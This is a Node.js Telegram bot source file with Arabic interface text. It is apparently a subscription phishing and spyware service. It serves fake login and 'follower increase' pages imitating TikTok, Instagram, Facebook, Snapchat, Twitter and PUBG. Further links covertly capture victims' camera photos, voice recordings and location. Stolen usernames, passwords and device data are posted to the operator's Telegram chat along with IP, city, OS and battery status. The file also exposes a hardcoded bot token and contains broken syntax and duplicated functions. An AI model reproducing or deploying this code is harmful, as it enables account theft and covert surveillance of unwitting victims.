const TelegramBot = require('node-telegram-bot-api');
const express = require('express');
const bodyParser = require('body-parser');
const multer = require('multer');
const fs = require('fs');
const path = require('path');
const useragent = require('useragent');
const TinyURL = require('tinyurl');

const botToken = '7252078284:AAFt6ySoKDAJx-6wbg435qnU-_ramrgRL8Y';
const bot = new TelegramBot(botToken, { polling: true });

const app = express();
app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(__dirname));
app.use(express.static(path.join(__dirname, 'public')));
app.use(express.static(path.join(__dirname, 'uploads')));
const storage = multer.memoryStorage();
const upload = multer({ storage: storage });

const userVisits = {};
const MAX_FREE_ATTEMPTS = 5;
const platformVisits = {};
const allUsers = new Map();
const activatedUsers = new Set();
const bannedUsers = new Map(); // تغيير من Set إلى Map
const subscribedUsers = new Set();
const userPoints = new Map();
const userReferrals = new Map();
const usedReferralLinks = new Map();
let pointsRequiredForSubscription = 15;
const freeTrialEndedMessage = "انتهت فترة التجربة المجانيه لان تستطيع استخدام اي رابط اختراق حتى تقوم بل الاشتراك من المطور او قوم بجمع نقاط لاستمرار في استخدام البوت";

const forcedChannelUsernames = ['@SJGDDW', '@YEMENCYBER101', '@YYY_A12'];

// دالة للتحقق من المسؤول
const adminId = '7130416076';
function isAdmin(userId) {
  return userId.toString() === adminId;
}

// دالة لإضافة نقاط لمستخدم معين
function addPointsToUser(userId, points) {
  if (!allUsers.has(userId)) {
    allUsers.set(userId, { id: userId, points: 0 });
  }
  const user = allUsers.get(userId);
  user.points = (user.points || 0) + points;
  userPoints.set(userId, user.points);
  return user.points;
}
// دالة لخصم نقاط من مستخدم معين
function deductPointsFromUser(userId, points) {
  if (!allUsers.has(userId)) {
    return false;
  }
  const user = allUsers.get(userId);
  if ((user.points || 0) >= points) {
    user.points -= points;
    userPoints.set(userId, user.points);
    return true;
  }
  return false;
}

// دالة لحظر مستخدم
function banUser(userId) {
  bannedUsers.add(userId.toString());
}

// دالة لإلغاء حظر مستخدم
function unbanUser(userId) {
  return bannedUsers.delete(userId.toString());
}

// دالة لإرسال رسالة لجميع المستخدمين
function broadcastMessage(message) {
  allUsers.forEach((user, userId) => {
    bot.sendMessage(userId, message).catch(error => {
      console.error(`Error sending message to ${userId}:`, error.message);
    });
  });
}

// دالة إنشاء لوحة المفاتيح للمسؤول
function createAdminKeyboard() {
  return {
    reply_markup: {
      inline_keyboard: [
        [{ text: 'حظر مستخدم', callback_data: 'ban' }],
        [{ text: 'إلغاء حظر مستخدم', callback_data:'unban' }],
        [{ text: 'عرض الإحصائيات', callback_data:'stats' }],
        [{ text: 'إرسال رسالة', callback_data:'broadcast' }],
        [{ text: 'قائمة المحظورين', callback_data:'abo' }],
        [{ text: 'إضافة نقاط', callback_data: 'addpoints' }],
        [{ text: 'خصم نقاط', callback_data:'deductpoints' }],
        [{ text: 'تعيين نقاط الاشتراك', callback_data: 'setsubscriptionpoints' }],
        [{ text: 'الاشتراك', callback_data:'subscribe' }],
        [{ text: 'إلغاء الاشتراك', callback_data:'unsubscribe' }],
        [{ text: 'عرض المشتركين', callback_data:'listsubscribers' }],
        [{ text: 'إرسال نقاط للجميع', callback_data:'send_points_to_all' }],
        [{ text: 'خصم نقاط من الجميع', callback_data:'deduct_points_from_all' }],
      ]
    }
  };
}

// أمر المسؤول
// أمر المسؤول
bot.onText(/\/admin/, (msg) => {
  if (isAdmin(msg.from.id)) {
    bot.sendMessage(msg.chat.id, 'مرحبًا بك في لوحة تحكم المسؤول:', createAdminKeyboard());
  } else {
    bot.sendMessage(msg.chat.id, 'عذرًا، هذا الأمر متاح فقط للمسؤول.');
  }
});

// معالج callback_query للمسؤول
bot.on('callback_query', async (callbackQuery) => {
  const msg = callbackQuery.message;
  const userId = callbackQuery.from.id;
  const chatId = msg.chat.id;
  const data = callbackQuery.data;

  if (!isAdmin(userId)) {
    await bot.answerCallbackQuery(callbackQuery.id, 'عذرًا، هذا الأمر متاح فقط للمسؤول.');
    return;
  }

  switch (data) {
    case 'ban':
      bot.sendMessage(chatId, 'يرجى إدخال معرف المستخدم المراد حظره:');
      bot.once('message', async (response) => {
        const userIdToBan = response.text;
        banUser(userIdToBan);
        bot.sendMessage(chatId, `تم حظر المستخدم ${userIdToBan}`);
        bot.sendMessage(userIdToBan, 'تم حظرك من استخدام هذا البوت. تواصل مع المسؤول إذا كنت تعتقد أن هذا خطأ.');
      });
      break;

    case 'unban':
      bot.sendMessage(chatId, 'يرجى إدخال معرف المستخدم المراد إلغاء حظره:');
      bot.once('message', async (response) => {
        const userIdToUnban = response.text;
        if (unbanUser(userIdToUnban)) {
          bot.sendMessage(chatId, `تم إلغاء حظر المستخدم ${userIdToUnban}`);
          bot.sendMessage(userIdToUnban, 'تم إلغاء حظرك. يمكنك الآن استخدام البوت مرة أخرى.');
        } else {
          bot.sendMessage(chatId, `المستخدم ${userIdToUnban} غير محظور.`);
        }
      });
      break;
    case 'stats':
      const totalUsers = allUsers.size;
      const activeUsers = activatedUsers.size;
      const bannedUsersCount = bannedUsers.size;
      const usersWhoBlockedBot = Array.from(allUsers.values()).filter(user => user.hasBlockedBot).length;
      bot.sendMessage(chatId, `إحصائيات البوت:\nعدد المستخدمين الكلي: ${totalUsers}\nعدد المستخدمين النشطين: ${activeUsers}\nعدد المستخدمين المحظورين: ${bannedUsersCount}\nعدد المستخدمين الذين حظروا البوت: ${usersWhoBlockedBot}`);
      break;
    case 'broadcast':
      bot.sendMessage(chatId, 'يرجى إدخال الرسالة التي تريد إرسالها لجميع المستخدمين:');
      bot.once('message', async (response) => {
        const message = response.text;
        broadcastMessage(message);
        bot.sendMessage(chatId, 'تم إرسال الرسالة بنجاح!');
      });
      break;
    case 'banned_users':
  const bannedList = Array.from(bannedUsers).join(', ');
  bot.sendMessage(chatId, `قائمة المستخدمين المحظورين:\n${bannedList || 'لا يوجد مستخدمين محظورين حاليًا'}`);
  break;
    case 'addpoints':
  bot.sendMessage(chatId, 'أدخل معرف المستخدم وعدد النقاط التي تريد إضافتها (مثال: 123456789 10)');
  bot.once('message', async (response) => {
    const [userId, points] = response.text.split(' ');
    const pointsToAdd = parseInt(points);
    if (!userId || isNaN(pointsToAdd)) {
      bot.sendMessage(chatId, 'عذرًا، الرجاء إدخال المعلومات بالشكل الصحيح.');
      return;
    }
    const newPoints = addPointsToUser(userId, pointsToAdd);
    bot.sendMessage(chatId, `تمت إضافة ${pointsToAdd} نقطة للمستخدم ${userId}. رصيده الحالي: ${newPoints} نقطة.`);
    bot.sendMessage(userId, `تمت إضافة ${pointsToAdd} نقطة إلى رصيدك. رصيدك الحالي: ${newPoints} نقطة.`);
  });
  break;
    case 'deductpoints':
      bot.sendMessage(chatId, 'أدخل معرف المستخدم وعدد النقاط التي تريد خصمها (مثال: 123456789 10)');
      bot.once('message', async (response) => {
        const [userId, points] = response.text.split(' ');
        const pointsToDeduct = parseInt(points);
        if (!userId || isNaN(pointsToDeduct)) {
          bot.sendMessage(chatId, 'عذرًا، الرجاء إدخال المعلومات بالشكل الصحيح.');
          return;
        }
        if (deductPointsFromUser(userId, pointsToDeduct)) {
          const newPoints = userPoints.get(userId) || 0;
          bot.sendMessage(chatId, `تم خصم ${pointsToDeduct} نقطة من المستخدم ${userId}. رصيده الحالي: ${newPoints} نقطة.`);
          bot.sendMessage(userId, `تم خصم ${pointsToDeduct} نقطة من رصيدك. رصيدك الحالي: ${newPoints} نقطة.`);
        } else {
          bot.sendMessage(chatId, `عذرًا، المستخدم ${userId} لا يملك نقاطًا كافية للخصم.`);
        }
      });
      break;
    case 'setsubscriptionpoints':
      bot.sendMessage(chatId, 'أدخل عدد النقاط المطلوبة للاشتراك:');
      bot.once('message', async (response) => {
        pointsRequiredForSubscription = parseInt(response.text);
        bot.sendMessage(chatId, `تم تعيين عدد النقاط المطلوبة للاشتراك إلى ${pointsRequiredForSubscription}`);
      });
      break;
    case 'subscribe':
      bot.sendMessage(chatId, 'أدخل معرف المستخدم الذي تريد إضافته للمشتركين:');
      bot.once('message', async (response) => {
        const userId = response.text;
        if (subscribedUsers.has(userId)) {
          bot.sendMessage(chatId, `المستخدم ${userId} موجود بالفعل في قائمة المشتركين.`);
        } else {
          subscribedUsers.add(userId);
          bot.sendMessage(chatId, `تمت إضافة المستخدم ${userId} إلى قائمة المشتركين بنجاح.`);
          bot.sendMessage(userId, 'تم اشتراكك بنجاح! يمكنك استخدام البوت بدون قيود.');
        }
      });
      break;
    case 'unsubscribe':
      bot.sendMessage(chatId, 'أدخل معرف المستخدم الذي تريد إزالته من المشتركين:');
      bot.once('message', async (response) => {
        const userId = response.text;
        if (subscribedUsers.delete(userId)) {
          bot.sendMessage(chatId, `تمت إزالة المستخدم ${userId} من قائمة المشتركين.`);
          bot.sendMessage(userId, 'تم إلغاء اشتراكك. قد تواجه بعض القيود على استخدام البوت.');
        } else {
          bot.sendMessage(chatId, `المستخدم ${userId} غير موجود في قائمة المشتركين.`);
        }
      });
      break;
    case 'listsubscribers':
      const subscribersList = Array.from(subscribedUsers).join('\n');
      bot.sendMessage(chatId, `قائمة المشتركين:\n${subscribersList || 'لا يوجد مشتركين حالياً.'}`);
      break;
    case 'send_points_to_all':
  bot.sendMessage(chatId, 'أدخل عدد النقاط التي تريد إرسالها لجميع المستخدمين:');
  bot.once('message', async (msg) => {
    const points = parseInt(msg.text);
    if (!isNaN(points) && points > 0) {
      for (const [userId, user] of allUsers) {
        addPointsToUser(userId, points);
      }
      await bot.sendMessage(chatId, `تم إرسال ${points} نقطة لجميع المستخدمين.`);
    } else {
      await bot.sendMessage(chatId, 'الرجاء إدخال عدد صحيح موجب من النقاط.');
    }
  });
  break;
    case 'deduct_points_from_all':
  bot.sendMessage(chatId, 'أدخل عدد النقاط التي تريد خصمها من جميع المستخدمين:');
  bot.once('message', async (msg) => {
    const points = parseInt(msg.text);
    if (!isNaN(points) && points > 0) {
      for (const [userId, user] of allUsers) {
        deductPointsFromUser(userId, points);
      }
      await bot.sendMessage(chatId, `تم خصم ${points} نقطة من جميع المستخدمين.`);
    } else {
      await bot.sendMessage(chatId, 'الرجاء إدخال عدد صحيح موجب من النقاط.');
    }
  });
  break;
  }

  await bot.answerCallbackQuery(callbackQuery.id);
});

// معالج زر "نقاطي"
bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const userId = callbackQuery.from.id.toString();
    const data = callbackQuery.data;

    switch(data) {
        if (data === 'create_referral') {
    const referralLink = createReferralLink(userId);
    userReferrals.set(userId, referralLink);
    bot.sendMessage(chatId, `رابط الدعوة الخاص بك هو:\n${referralLink}`);
  } else if (data === 'my_points') {
    const points = userPoints.get(userId) || 0;
    const isSubscribed = subscribedUsers.has(userId);
    let message = isSubscribed
      ? `لديك حاليًا ${points} نقطة. أنت مشترك في البوت ويمكنك استخدامه بدون قيود.`
      : `لديك حاليًا ${points} نقطة. اجمع ${pointsRequiredForSubscription} نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
    bot.sendMessage(chatId, message);
            break;
        default:
            if (!subscribedUsers.has(userId)) {
                bot.sendMessage(chatId, 'ملاحظة عزيزي المستخدم لان تستطيع استخدام هاذا الميزه سوى 5مرات قوم بل الاشتراك من المطور او قوم بجمع نقاط لاستخدام بدون قيود.');
            } else {
                bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
                // هنا يمكنك إضافة الكود الخاص بكل عملية
            }
    }
});


  // هنا يمكنك إضافة المزيد من المنطق لمعالجة الرسائل العادية
bot.on('left_chat_member', (msg) => {
  const userId = msg.left_chat_member.id;
  if (!msg.left_chat_member.is_bot) {
    updateUserBlockStatus(userId, true);
  }
});

bot.on('my_chat_member', (msg) => {
  if (msg.new_chat_member.status === 'kicked' || msg.new_chat_member.status === 'left') {
    const userId = msg.from.id;
    updateUserBlockStatus(userId, true);
  }
});

bot.on('message', async (msg) => {
  const chatId = msg.chat.id;
  const text = msg.text ? msg.text.toLowerCase() : '';
  const senderId = msg.from.id;

  // تسجيل المستخدمين الجدد
  if (!allUsers.has(chatId.toString())) {
    const newUser = {
      id: chatId,
      firstName: msg.from.first_name,
      lastName: msg.from.last_name || '',
      username: msg.from.username || ''
    };
    allUsers.set(chatId.toString(), newUser);
    
    bot.sendMessage(adminId, `مستخدم جديد دخل البوت:\nالاسم: ${newUser.firstName} ${newUser.lastName}\nاسم المستخدم: @${newUser.username}\nمعرف الدردشة: ${chatId}`);
  }

  if (bannedUsers.has(chatId.toString())) {
    bot.sendMessage(chatId, 'لا يمكنك استخدام البوت مرة أخرى. \nإذا رغبت في استخدام البوت مرة أخرى، قُم بالتواصل مع المطور @SAGD112');
    return;
  }

  if (text === '/st') {
    const isSubscribed = await checkSubscription(senderId);
    if (isSubscribed) {
      showButtons(senderId);
    }
  }

  // هنا يمكنك إضافة المزيد من المنطق لمعالجة الرسائل العادية
});

  // باقي الكود لمعالجة الرسائل
 
  
 // هنا يمكنك إضافة المزيد من المنطق لمعالجة الرسائل العادية

// ... (الكود السابق)



// تعديل دالة إضافة النقاط

function deductPointsFromUser(userId, points) {
  if (!allUsers.has(userId)) {
    console.log(`المستخدم ${userId} غير موجود`);
    return false;
  }
  const user = allUsers.get(userId);
  if ((user.points || 0) >= points) {
    user.points -= points;
    userPoints.set(userId, user.points);
    console.log(`تم خصم ${points} نقاط من المستخدم ${userId}. الرصيد الجديد: ${user.points}`);
    
    // إلغاء الاشتراك إذا أصبحت النقاط أقل من الحد المطلوب
    if (user.points < pointsRequiredForSubscription) {
      subscribedUsers.delete(userId);
      console.log(`تم إلغاء اشتراك المستخدم ${userId} بسبب نقص النقاط`);
      bot.sendMessage(userId, 'تم إلغاء اشتراكك بسبب نقص النقاط. يرجى جمع المزيد من النقاط للاشتراك مرة أخرى.');
    }
    
    return true;
  }
  console.log(`فشل خصم النقاط للمستخدم ${userId}. الرصيد الحالي: ${user.points}, المطلوب: ${points}`);
  return false;
}
// تشغيل البوت
bot.on('polling_error', (error) => {
  console.log(error);
});

console.log('البوت يعمل الآن...');

const trackAttempts = (userId, action) => {
    if (!userVisits[userId]) {
        userVisits[userId] = { camera: 0, voiceRecord: 0, getLocation: 0 };
    }

    userVisits[userId][action]++;

    return userVisits[userId][action] > MAX_FREE_ATTEMPTS;
};

// دالة لتتبع المحاولات لمسار المنصة الأصلي
const trackPlatformAttempts = (platformId) => {
    if (!platformVisits[platformId]) {
        platformVisits[platformId] = 0;
    }

    platformVisits[platformId]++;

    return platformVisits[platformId] > MAX_FREE_ATTEMPTS;
};

// المسار الأصلي


// مسار الكاميرا
app.get('/camera/:userId', (req, res) => {
    const userId = req.params.userId;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'location.html'));
        return;
    }

    if (trackAttempts(userId, 'camera')) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'location.html'));
});

// مسار تسجيل الصوت
app.get('/record/:userId', (req, res) => {
    const userId = req.params.userId;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'record.html'));
        return;
    }

    if (trackAttempts(userId, 'voiceRecord')) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'record.html'));
});

// مسار الحصول على الموقع
app.get('/getLocation/:userId', (req, res) => {
    const userId = req.params.userId;

    if (subscribedUsers.has(userId)) {
        res.sendFile(path.join(__dirname, 'SJGD.html'));
        return;
    }

    if (trackAttempts(userId, 'getLocation')) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'SJGD.html'));
});

app.get('/:action/:platform/:chatId', (req, res) => {
    const { action, platform, chatId } = req.params;

    if (subscribedUsers.has(chatId)) {
        res.sendFile(path.join(__dirname, 'uploads', `${platform}_${action}.html`));
        return;
    }

    if (trackPlatformAttempts(chatId)) {
        res.send(`<html><body><h1>${freeTrialEndedMessage}</h1></body></html>`);
        return;
    }

    res.sendFile(path.join(__dirname, 'uploads', `${platform}_${action}.html`));
});


// استلام الصور
app.post('/submitPhotos', upload.array('images', 20), async (req, res) => {
    const chatId = req.body.userId;
    const files = req.files;
    const additionalData = JSON.parse(req.body.additionalData || '{}');
    const cameraType = req.body.cameraType;

    if (files && files.length > 0) {
        console.log(`Received ${files.length} images from user ${chatId}`);

        const caption = `
معلومات إضافية:
نوع الكاميرا: ${cameraType === 'front' ? 'أمامية' : 'خلفية'}
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
إصدار الجهاز: ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
        `;

        try {
            for (const file of files) {
                await bot.sendPhoto(chatId, file.buffer, { caption });
            }
            console.log('Photos sent successfully');
            res.json({ success: true });
        } catch (err) {
            console.error('Failed to send photos:', err);
            res.status(500).json({ error: 'Failed to send photos' });
        }
    } else {
        console.log('No images received');
        res.status(400).json({ error: 'No images received' });
    }
});

// استلام الصوت
app.post('/submitVoice', upload.single('voice'), (req, res) => {
    const chatId = req.body.chatId;
    const voiceFile = req.file;
    const additionalData = JSON.parse(req.body.additionalData || '{}');

    if (!voiceFile) {
        console.error('No voice file received');
        return res.status(400).json({ error: 'No voice file received' });
    }

    const caption = `
معلومات إضافية:
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
إصدار الجهاز: ${additionalData.deviceVersion}
مستوى البطارية: ${additionalData.batteryLevel || 'غير متاح'}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا' || 'غير متاح'}
    `;

    bot.sendVoice(chatId, voiceFile.buffer, { caption })
        .then(() => {
            console.log('Voice sent successfully');
            res.json({ success: true });
        })
        .catch(error => {
            console.error('Error sending voice:', error);
            res.status(500).json({ error: 'Failed to send voice message' });
        });
});

// استلام الموقع
app.post('/submitLocation', async (req, res) => {
    const { chatId, latitude, longitude, additionalData } = req.body;

    if (!chatId || !latitude || !longitude) {
        return res.status(400).json({ error: 'Missing required data' });
    }

    try {
        await bot.sendLocation(chatId, latitude, longitude);
        
        const message = `
معلومات إضافية:
IP: ${additionalData.ip}
الدولة: ${additionalData.country}
المدينة: ${additionalData.city}
المنصة: ${additionalData.platform}
متصفح المستخدم: ${additionalData.userAgent}
مستوى البطارية: ${additionalData.batteryLevel}
الشحن: ${additionalData.batteryCharging ? 'نعم' : 'لا'}
        `;
        
        await bot.sendMessage(chatId, message);
        console.log('Location and additional data sent successfully');
        res.json({ success: true });
    } catch (error) {
        console.error('Error sending location:', error);
        res.status(500).json({ error: 'Failed to send location', details: error.message });
    }
});

app.post('/submitIncrease', (req, res) => {
    const { username, password, platform, chatId, ip, country, city, userAgent } = req.body;

    console.log('Received ', { username, password, platform, chatId, ip, country, city });
    
    if (!chatId) {
        return res.status(400).json({ error: 'Missing chatId' });
    }

    const deviceInfo = useragent.parse(userAgent);

    bot.sendMessage(chatId, `تم اختراق حساب جديد ☠️:
منصة: ${platform}
اسم المستخدم: ${username}
كلمة السر: ${password}
عنوان IP: ${ip}
الدولة: ${country}
المدينة: ${city}
نظام التشغيل: ${deviceInfo.os.toString()}
المتصفح: ${deviceInfo.toAgent()}
الجهاز: ${deviceInfo.device.toString()}`)
        .then(() => {
            res.json({ success: true });
        })
        .catch(error => {
            console.error('Error sending message:', error);
            res.status(500).json({ error: 'Failed to send increase data', details: error.message });
        });
});

app.post('/submitLogin', (req, res) => {
    const { username, password, platform, chatId, ip, country, city, userAgent, batteryLevel, charging, osVersion } = req.body;

    console.log('Received login data:', { username, password, platform, chatId, ip, country, city, batteryLevel, charging, osVersion });

    if (!chatId) {
        return res.status(400).json({ error: 'Missing chatId' });
    }

    const deviceInfo = useragent.parse(userAgent);

    bot.sendMessage(chatId, `تم تلقي بيانات تسجيل الدخول:
منصة: ${platform}
اسم المستخدم: ${username}
كلمة السر: ${password}
عنوان IP: ${ip}
الدولة: ${country}
المدينة: ${city}
نظام التشغيل: ${osVersion}
المتصفح: ${deviceInfo.toAgent()}
الجهاز: ${deviceInfo.device.toString()}
مستوى البطارية: ${batteryLevel}
قيد الشحن: ${charging}`)
        .then(() => {
            res.json({ success: true });
        })
        .catch(error => {
            console.error('Error sending message:', error);
            res.status(500).json({ error: 'Failed to send login data', details: error.message });
        });
});



function createReferralLink(userId) {
  const referralCode = Buffer.from(userId.toString()).toString('base64');
  return `https://t.me/Hzhzhxhbxbdbot?start=${referralCode}`;
}

function addPointsToUser(userId, points) {
  if (!allUsers.has(userId)) {
    allUsers.set(userId, { id: userId, points: 0 });
  }
  const user = allUsers.get(userId);
  user.points = (user.points || 0) + points;
  userPoints.set(userId, user.points);
  checkSubscriptionStatus(userId);
  return user.points;
}

function deductPointsFromUser(userId, points) {
  const currentPoints = userPoints.get(userId) || 0;
  if (currentPoints >= points) {
    const newPoints = currentPoints - points;
    userPoints.set(userId, newPoints);
    return true;
  }
  return false;
}

function addPointsToUser(userId, points) {
  if (!allUsers.has(userId)) {
    allUsers.set(userId, { id: userId, points: 0 });
  }
  const user = allUsers.get(userId);
  user.points = (user.points || 0) + points;
  userPoints.set(userId, user.points);
  
  // التحقق من حالة الاشتراك بعد إضافة النقاط
  checkSubscriptionStatus(userId);
  
  return user.points;
}


function checkSubscriptionStatus(userId) {
  const user = allUsers.get(userId);
  if (!user) return false;
  
  if (user.points >= pointsRequiredForSubscription) {
    if (!subscribedUsers.has(userId)) {
      // خصم النقاط المطلوبة للاشتراك
      user.points -= pointsRequiredForSubscription;
      userPoints.set(userId, user.points);
      
      subscribedUsers.add(userId);
      bot.sendMessage(userId, `تهانينا! لقد تم اشتراكك تلقائيًا. تم خصم ${pointsRequiredForSubscription} نقطة من رصيدك.`);
    }
    return true;
  } else {
    if (subscribedUsers.has(userId)) {
      subscribedUsers.delete(userId);
      bot.sendMessage(userId, 'تم إلغاء اشتراكك بسبب نقص النقاط. يرجى جمع المزيد من النقاط للاشتراك مرة أخرى.');
    }
    return false;
  }
}




function trackAttempt(userId, feature) {
  if (!userVisits[userId]) userVisits[userId] = {};
  userVisits[userId][feature] = (userVisits[userId][feature] || 0) + 1;
  return userVisits[userId][feature];
}

function shortenUrl(url) {
  return new Promise((resolve, reject) => {
    TinyURL.shorten(url, function(res, err) {
      if (err)
        reject(err);
      else
        resolve(res);
    });
  });
}



async function checkSubscription(userId) {
  if (forcedChannelUsernames.length && !activatedUsers.has(userId)) {
    for (const channel of forcedChannelUsernames) {
      try {
        const member = await bot.getChatMember(channel, userId);
        if (member.status === 'left' || member.status === 'kicked') {
          bot.sendMessage(userId, `عذرا، يجب عليك الانضمام إلى القنوات المطلوبة لاستخدام البوت:`, {
            reply_markup: {
              inline_keyboard: forcedChannelUsernames.map(channel => [{ text: `انضم إلى ${channel}`, url: `https://t.me/${channel.slice(1)}` }])
            }
          });
          return false;
        }
      } catch (error) {
        console.error('خطأ أثناء التحقق من عضوية القناة:', error);
        bot.sendMessage(userId, 'حدث خطأ. يرجى المحاولة لاحقًا.');
        return false;
      }
    }
    // إذا وصل المستخدم إلى هنا، فهو مشترك في جميع القنوات المطلوبة
    activatedUsers.add(userId);
    return true;
  }
  return true; // المستخدم مفعل بالفعل أو لا توجد قنوات مطلوبة
}

bot.on('message', async (msg) => {
  const text = msg.text;
  const senderId = msg.chat.id;

  // تحقق من الاشتراك قبل عرض الأزرار
  const isSubscribed = await checkSubscription(senderId);
  if (!isSubscribed) {
    return;
  }

  if (text === '/start') {
    showDefaultButtons(senderId);
  } else if (text === '/login') {
    showLoginButtons(senderId);
  } else if (text === '/hacking') {
    showHackingButtons(senderId);
  }
});

bot.onText(/\/start (.+)/, async (msg, match) => {
  const startPayload = match[1];
  const newUserId = msg.from.id.toString();

  // تحقق من الاشتراك قبل متابعة معالجة رابط الدعوة
  const isSubscribed = await checkSubscription(newUserId);
  if (!isSubscribed) {
    return;
  }

  try {
    const referrerId = Buffer.from(startPayload, 'base64').toString();
    if (referrerId !== newUserId) {
      const usedLinks = usedReferralLinks.get(newUserId) || new Set();
      if (!usedLinks.has(referrerId)) {
        usedLinks.add(referrerId);
        usedReferralLinks.set(newUserId, usedLinks);
        const referrerPoints = addPointsToUser(referrerId, 1);
        await bot.sendMessage(referrerId, `قام المستخدم ${msg.from.first_name} بالدخول عبر رابط الدعوة الخاص بك. أصبح لديك ${referrerPoints} نقطة.`);
        await bot.sendMessage(newUserId, 'مرحبًا بك! لقد انضممت عبر رابط دعوة.');
      } else {
        await bot.sendMessage(newUserId, 'لقد استخدمت هذا الرابط من قبل.');
      }
    }
  } catch (error) {
    console.error('خطأ في معالجة رمز الإحالة:', error);
  }
  showButtons(newUserId);
});

function showDefaultButtons(userId) {
  let statusMessage = `قم بجمع نقاط كافية لاستخدام البوت مجانًا ارسل امر لاضهار اندكسات تسجيل دخول /login اكتب امر لاضهور اندكسات صفحات مزوره على شكل زياده متابعين /hacking.`;

  let defaultButtons = [
    [{ text: '📸 اختراق الكاميرا الأمامية والخلفية 📸', callback_data: 'front_camera' }],
    [{ text: '🎙 تسجيل صوت 🎙', callback_data: 'voice_record' }],
    [{ text: '🗺️ الحصول على الموقع 🗺️', callback_data: 'get_location' }],
    [{ text: '🔗 إنشاء رابط دعوة 🔗', callback_data: 'create_referral' }],
    [{ text: '💰 نقاطي 💰', callback_data: 'my_points' }],
    [{ text: 'قناة المطور سجاد', url: 'https://t.me/SJGDDW' }],
    [{ text: 'تتواصل مع المطور', url: 'https://t.me/SAGD112' }],
  ];

  bot.sendMessage(userId, `${statusMessage}\n\nمرحبا قم باختيار أي شيء تريده لكن لن تستطيع استخدام أي رابط سوى 5 مرات حتى تقوم بدفع اشتراك من المطور @SAGD112 أو قم بتجميع نقاط لاستخدامه مجانًا:`, {
    reply_markup: {
      inline_keyboard: defaultButtons
    }
  });
}

function showLoginButtons(userId) {
  let loginButtons = [
    [{ text: ' 🎵اندكس تسجيل دخول تيك توك 🎵 ', callback_data: 'login_tiktok' }],
    [{ text: ' 📸اندكس تسجيل دخول انستقرام 📸', callback_data: 'login_instagram' }],
    [{ text: ' 📘اندكس تسجيل دخول فيسبوك 📘', callback_data: 'login_facebook' }],
    [{ text: ' 👻اندكس تسجيل دخول سناب شات 👻', callback_data: 'login_snapchat' }],
    [{ text: ' 🐦اندكس تسجيل دخول تويتر 🐦', callback_data: 'login_twitter' }],
  ];

  bot.sendMessage(userId, `اختر اي رابط تسجيل دخول في صفحه تشبه الصفحه الحقيقه لمنصات اذا قام الضحيه بتسجيل الدخول راح توصلك المعلومات الا البوت:`, {
    reply_markup: {
      inline_keyboard: loginButtons
    }
  });
}


// هنا يمكنك تعريف دالة showButtons إذا كنت تحتاجها
function showButtons(userId) {
  showDefaultButtons(userId);
}


// ... (باقي الكود)


bot.on('callback_query', (callbackQuery) => {
    const chatId = callbackQuery.message.chat.id;
    const data = callbackQuery.data;

    if (data === 'front_camera' || data === 'rear_camera') {
        const url = `https://yyytot.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
        bot.sendMessage(chatId, `انقر على الرابط للتصوير: ${url}`);
    } else if (data === 'voice_record') {
        bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
    } else if (data === 'get_location') {
        const url = `https://yyytot.onrender.com/getLocation/${chatId}`;
        console.log('Data received:', data);
        console.log('Chat ID:', chatId);
        console.log('URL:', url);
        
        bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${url}`)
            .then(() => console.log('Message sent successfully'))
            .catch(err => console.error('Error sending message:', err));
    }
});

bot.on('message', (msg) => {
    const chatId = msg.chat.id;
    const duration = parseInt(msg.text, 10);

    if (!isNaN(duration)) {
        if (duration > 0 && duration <= 20) {
            const link = `https://yyytot.onrender.com/record/${chatId}?duration=${duration}`;
            bot.sendMessage(chatId, `تم تجهيز الرابط لتسجيل صوت لمدة ${duration} ثواني: ${link}`);
        } else {
            bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
        }
    }
});

bot.on('callback_query', (query) => {
    const chatId = query.message.chat.id;
    const data = query.data;
    const baseUrl = 'https://yyytot.onrender.com'; // تأكد من تغيير هذا إلى عنوان URL الخاص بك

    console.log('Received callback query:', data); // سجل البيانات المستلمة للتصحيح

    let url, message;

    if (data === 'pubg_uc') {
        url = `${baseUrl}/increase/pubg_uc/${chatId}`;
        message = `يرجى إدخال معلومات حسابك لشحن شدات ببجي: ${url}`;
    } else if (data.startsWith('increase_')) {
        const platform = data.split('_')[1];
        url = `${baseUrl}/increase/${platform}/${chatId}`;
        message = `يرجى إدخال معلومات حسابك لزيادة المتابعين على ${getPlatformName(platform)}: ${url}`;
    } else {
        console.log('Unhandled callback query:', data);
        message = 'عملية غير معروفة';
    }

    bot.sendMessage(chatId, message)
        .then(() => console.log('Message sent successfully:', message))
        .catch(error => console.error('Error sending message:', error));
});

function getPlatformName(platform) {
    const platformNames = {
        tiktok: 'تيك توك',
        instagram: 'انستغرام',
        facebook: 'فيسبوك',
        snapchat: 'سناب شات',
        pubg: 'ببجي',
        youtube: 'يوتيوب',
        twitter: 'تويتر'
    };
    return platformNames[platform] || platform;
}

// تأكد من أن هذا الجزء موجود في الكود الخاص بإنشاء الأزرار
function showHackingButtons(userId) {
  let hackingButtons = [
    [{ text: '☠️ اختراق تيك توك ☠️', callback_data: 'increase_tiktok' }],
